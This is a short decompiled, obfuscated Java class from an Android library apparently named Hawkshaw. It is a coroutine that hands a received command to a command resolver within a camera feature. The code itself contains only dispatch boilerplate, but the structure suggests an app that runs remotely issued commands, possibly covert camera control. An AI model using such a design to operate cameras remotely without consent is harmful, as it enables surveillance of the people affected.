package com.hawkshaw.library.features.media.camera;

import W2.y;
import Y1.C0110h;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.handler.CommandResolverKt;
import com.hawkshaw.library.handler.CommandSource;
import i3.p;
import t3.E;

public final class i extends C0331i implements p {

    /* renamed from: D  reason: collision with root package name */
    public int f5011D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ Command f5012E;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public i(Command command, e eVar) {
        super(2, eVar);
        this.f5012E = command;
    }

    public final e create(Object obj, e eVar) {
        return new i(this.f5012E, eVar);
    }

    public final Object invoke(Object obj, Object obj2) {
        return ((i) create((E) obj, (e) obj2)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f5011D;
        if (i5 == 0) {
            C0110h.P(obj);
            this.f5011D = 1;
            if (CommandResolverKt.handleCommand$default(this.f5012E, (CommandSource) null, this, 2, (Object) null) == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return y.f2418a;
    }
}
